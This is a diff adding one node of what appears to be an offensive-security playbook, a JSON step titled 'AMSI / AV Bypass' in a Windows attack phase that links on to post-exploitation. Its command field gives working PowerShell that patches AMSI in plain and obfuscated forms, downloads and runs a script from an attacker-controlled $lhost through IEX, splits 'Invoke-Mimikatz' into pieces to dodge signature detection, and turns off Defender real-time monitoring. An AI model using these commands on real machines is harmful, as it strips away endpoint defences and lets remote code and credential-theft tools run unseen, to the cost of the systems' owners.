@@ -1,0 +1,18 @@
+{
+  "id": "amsi_bypass",
+  "phase": "WINDOWS",
+  "title": "AMSI / AV Bypass",
+  "body": "AMSI blocks PowerShell payloads in memory. Patch it first, then load tools. Obfuscation handles signature-based AV.",
+  "cmd": "# AMSI patch (run in PS session first)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Or: base64 encoded AMSI bypass\n$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')\n$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')\n$b.SetValue($null,$true)\n\n# Obfuscated download cradle (evades string detection)\n$c = New-Object Net.WebClient\n$c.DownloadString('http://$lhost/tool.ps1') | IEX\n\n# Invoke-Obfuscation (offline tool)\nInvoke-Obfuscation -ScriptPath shell.ps1 -Command TOKEN\\ALL\\1\n\n# Simple string concat to evade sig detection\n$cmd = 'Inv'+'oke-Mi'+'mikatz'\n\n# Defender exclusion (if admin)\nSet-MpPreference -DisableRealtimeMonitoring $true\nAdd-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"",
+  "warn": "AMSI patches are session-scoped — must run in every new PS session before loading tools.",
+  "choices": [
+    {
+      "label": "AMSI bypassed — load tools",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Still blocked — try different bypass",
+      "next": "amsi_bypass"
+    }
+  ]
+}
